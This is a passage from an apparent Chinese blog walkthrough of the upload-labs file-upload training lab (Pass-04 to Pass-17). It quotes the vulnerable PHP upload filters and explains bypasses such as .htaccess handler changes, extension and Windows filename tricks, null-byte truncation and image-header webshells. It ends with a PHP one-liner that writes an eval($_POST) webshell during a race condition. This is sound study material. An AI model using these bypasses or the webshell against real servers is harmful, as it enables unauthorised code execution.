<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AllowOverride All</div></pre></td></tr></table></figure>
<p>(2) 修改httpd.conf，增加如下语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LoadModule rewrite_module modules/mod_rewrite.so</div></pre></td></tr></table></figure>
<p>第一步: 在.htaccess文件中写入如下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AddType application/x-httpd-php .jpg</div></pre></td></tr></table></figure>
<p>上传.htaccess<br>第二步: 修改shell.php为shell.jpg然后访问即可发现服务器对其进行了解析</p>
<p>注: 此处的方法在Pass-03中也是可以使用的</p>
<h3 id="0x05-Pass-05"><a href="#0x05-Pass-05" class="headerlink" title="0x05 Pass-05"></a>0x05 Pass-05</h3><p>首先分析代码，我们可以看到这句<code>$file_ext = strrchr($file_name, &#39;.&#39;);</code>中的<code>strrchr()</code>函数是有点问题的。这个函数的意思是“函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符”。</p>
<p>又考虑到apache的1.x版本和2.x版本是存在解析漏洞的，即“当碰到不认识的扩展名时，将会从后向前解析，直到碰到认识的 扩展名，如果都不认识，则会暴露其源码。比如 1.php.rar.ss.aa 会被当做PHP脚本执行”。</p>
<p>所以在此我们只需要将我们shell.php的名称修改为shell.php.ace.aaa，然后上传即可。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</div><div class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</div><div class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%8812.54.13.png" alt="image"></p>
<p>注: 此处的黑名单是没有完全过滤的，并且在此处也没有将上传文件名转换为小写，比如形如shell.phP就可以达到上传绕过的目的</p>
<h3 id="0x06-Pass-06"><a href="#0x06-Pass-06" class="headerlink" title="0x06 Pass-06"></a>0x06 Pass-06</h3><p>从代码可以看到过滤的可以说很严了，所以这个时候我们要考虑下操作系统的特性，此处前18题均使用Windows操作系统，而Windows操作系统对文件的命名规则是有特点的，比如:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">   　　test.asp.</div><div class="line">   　　test.asp(空格)</div><div class="line">   　　test.php:1.jpg</div><div class="line">   　　test.php:: $DATA</div></pre></td></tr></table></figure>
<p>但是在此处代码过滤了’.’和’::$DATA’所以我们只能使用中间那两种方式。<br>注: 会被windows系统自动去掉不符合规则符号后面的内容<br>在此处使用burp抓包修改上传即可<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.14.55.png" alt="image"><br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.15.09.png" alt="image"></p>
<h3 id="0x07-Pass-07"><a href="#0x07-Pass-07" class="headerlink" title="0x07 Pass-07"></a>0x07 Pass-07</h3><p>此题bypass上传的原理与Pass-06相同，此处我们尝试下上传test.php .这种格式的文件，这种格式的文件在上传到Windows上之后文件中最后一个点会被去掉，所以你访问<code>test.php .</code>和访问<code>test.php</code>的效果是一样的。<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.36.04.png" alt="image"></p>
<h3 id="0x08-Pass-08"><a href="#0x08-Pass-08" class="headerlink" title="0x08 Pass-08"></a>0x08 Pass-08</h3><p>此题发现相较于Pass-07而言对<code>::$DATA</code>没有进行过滤，所以原理已经在Pass-06讲过了，在此处我们直接上传<code>test.php:: $DATA</code><br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.45.43.png" alt="image"></p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.47.38.png" alt="image"></p>
<h3 id="0x09-Pass-09"><a href="#0x09-Pass-09" class="headerlink" title="0x09 Pass-09"></a>0x09 Pass-09</h3><p>此题相较于Pass-07就多了下面这一行代码，所以我们可以采用与上原理相同的方式，构造<code>test.php. .</code>进行上传绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$file_name = deldot($file_name);//删除文件名末尾的点</div></pre></td></tr></table></figure>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.56.55.png" alt="image"></p>
<h3 id="0x10-Pass-10"><a href="#0x10-Pass-10" class="headerlink" title="0x10 Pass-10"></a>0x10 Pass-10</h3><p>首先分析下代码，可以看到问题出现在第8行的<code>str_ireplace()</code>函数，此函数在此的作用是对<code>$file_name</code>变量中含有<code>$deny_ext</code>内容的部分替换为空，但是此操作只执行一次。“只执行一次”就是问题所在，如果我们上传类似<code>test.pphphp</code>这样的文件，上传后文件会自动被修改为<code>test.php</code>进而成功上传shell。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</div><div class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</div><div class="line"></div><div class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</div><div class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name)) &#123;</div><div class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</div><div class="line">            $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%882.12.33.png" alt="image"><br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%882.14.07.png" alt="image"></p>
<h3 id="0x11-Pass-11"><a href="#0x11-Pass-11" class="headerlink" title="0x11 Pass-11"></a>0x11 Pass-11</h3><p>分析代码发现最终返回的图片链接是“存储路径名+重命名后的文件名”，看到这个我们就可以联想到使用%00截断路径。<br>我们首先修改参数为<code>index.php?save_path=../upload/test.php%00</code><br>；其次修改我们的<code>test.php</code>为<code>test.jpg</code>然后上传即可。<br>注: 此处应具有新建文件夹的权限，如果没有会报错并导致上传失败<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</div><div class="line">    <span class="comment">//substr()是返回从start参数开始的字符串的一部分</span></div><div class="line">    <span class="comment">//strrpos()是查找字符串在另一字符串中最后一次出现的位置</span></div><div class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</div><div class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</div><div class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</div><div class="line">            $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $msg = <span class="string">'上传失败！'</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="0x12-Pass-12"><a href="#0x12-Pass-12" class="headerlink" title="0x12 Pass-12"></a>0x12 Pass-12</h3><p>此题diff了一下，发现代码与Pass-11中的是一摸一样的，想换换花样的话在此处我们可以使用0x00截断。</p>
<p>%00和0x00截断的原理都是一样的，即系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束。</p>
<h3 id="0x13-Pass-13"><a href="#0x13-Pass-13" class="headerlink" title="0x13 Pass-13"></a>0x13 Pass-13</h3><p>分析下代码，发现此处就是对文件头进行了解析，此时只需要上传图片马或者在test.php文件的开头加上GIF89a即可。</p>
<p>多扯一句，图片马的制作就是将你的一句话木马追加到一张图片类型文件的后面。</p>
<p>此题的目的是上传，并不是getshell，所以到此就结束了，要想getshell还得配合文件解析漏洞。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</div><div class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</div><div class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></div><div class="line">    fclose($file);</div><div class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </div><div class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </div><div class="line">    $fileType = <span class="string">''</span>;    </div><div class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </div><div class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </div><div class="line">            $fileType = <span class="string">'jpg'</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </div><div class="line">            $fileType = <span class="string">'png'</span>;</div><div class="line">            <span class="keyword">break</span>;        </div><div class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </div><div class="line">            $fileType = <span class="string">'gif'</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:            </div><div class="line">            $fileType = <span class="string">'unknown'</span>;</div><div class="line">        &#125;    </div><div class="line">        <span class="keyword">return</span> $fileType;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $file_type = getReailFileType($temp_file);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</div><div class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</div><div class="line">            $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $msg = <span class="string">"上传失败"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%8810.56.46.png" alt="image"></p>
<h3 id="0x14-Pass-14"><a href="#0x14-Pass-14" class="headerlink" title="0x14 Pass-14"></a>0x14 Pass-14</h3><p>分析一下代码，虽然写的不一样了，但是跟上一题差不多。所以同理可得</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</div><div class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</div><div class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</div><div class="line">        <span class="comment">//getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息</span></div><div class="line">        $info = getimagesize($filename);</div><div class="line">        <span class="comment">//image_type_to_extension()根据给定的常量 IMAGETYPE_XXX 返回后缀名</span></div><div class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</div><div class="line">        <span class="keyword">if</span>(stripos($types,$ext))&#123;</div><div class="line">            <span class="keyword">return</span> $ext;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $res = isImage($temp_file);</div><div class="line">    <span class="keyword">if</span>(!$res)&#123;</div><div class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</div><div class="line">            $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $msg = <span class="string">"上传失败"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%8811.14.44.png" alt="image"></p>
<h3 id="0x15-Pass-15"><a href="#0x15-Pass-15" class="headerlink" title="0x15 Pass-15"></a>0x15 Pass-15</h3><p>分析一下代码，关键在于<code>exif_imagetype()</code>函数，这个函数的意思是读取一个图像的第一个字节并检查其签名。注意此处只检测图像的第一个字节。所以在此处我们在上一题使用的方法依旧可以生效</p>
<p>Like</p>
<p>JPG<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FF D8 FF E0 00 10 4A 46 49 46</div></pre></td></tr></table></figure></p>
<p>GIF<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">47 49 46 38 39 61</div></pre></td></tr></table></figure></p>
<p>(相当于文本的GIF89a)</p>
<p>PNG<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">89 50 4E 47</div></pre></td></tr></table></figure></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</div><div class="line">    <span class="comment">//需要开启php_exif模块</span></div><div class="line">    $image_type = exif_imagetype($filename);</div><div class="line">    <span class="keyword">switch</span> ($image_type) &#123;</div><div class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</div><div class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</div><div class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</div><div class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</div><div class="line">            <span class="keyword">break</span>;    </div><div class="line">        <span class="keyword">default</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $res = isImage($temp_file);</div><div class="line">    <span class="keyword">if</span>(!$res)&#123;</div><div class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</div><div class="line">            $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $msg = <span class="string">"上传失败"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="0x16-Pass-16"><a href="#0x16-Pass-16" class="headerlink" title="0x16 Pass-16"></a>0x16 Pass-16</h3><p>分析代码发现此处对图片进行了二次渲染比对，这里的原理是对比两张经过php-gd库转换过的gif图片，如果其中存在相同之处，这就证明这部分图片数据不会经过转换。然后我可以注入代码到这部分图片文件中，最终实现远程代码执行。</p>
<p>此处给一个已经构造的好的包含<code>&lt;?phpinfo();?&gt;</code>的图片，<a href="https://pan.baidu.com/s/1xzHZYPHsgsI0V5CNZsGpLQ" target="_blank" rel="external">PoC</a>  密码:o34g</p>
<h3 id="0x17-Pass-17"><a href="#0x17-Pass-17" class="headerlink" title="0x17 Pass-17"></a>0x17 Pass-17</h3><p>分析下代码发现多了<code>unlink()</code>函数，这个函数的作用是删除指定文件，看到这个基本就可以确定这是一个条件竞争写shell了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</div><div class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</div><div class="line">    $upload_file = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</div><div class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</div><div class="line">             $img_path = $UPLOAD_ADDR . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div><div class="line">             rename($upload_file, $img_path);</div><div class="line">             $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</div><div class="line">            unlink($upload_file);</div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $msg = <span class="string">'上传失败！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们首先先上传一个php脚本，内容如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php fputs(fopen(&quot;./info.php&quot;, &quot;w&quot;), &apos;&lt;?php @eval($_POST[&quot;drops&quot;]) ?&gt;&apos;); ?&gt;</div></pre></td></tr></table></figure>
<p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p>
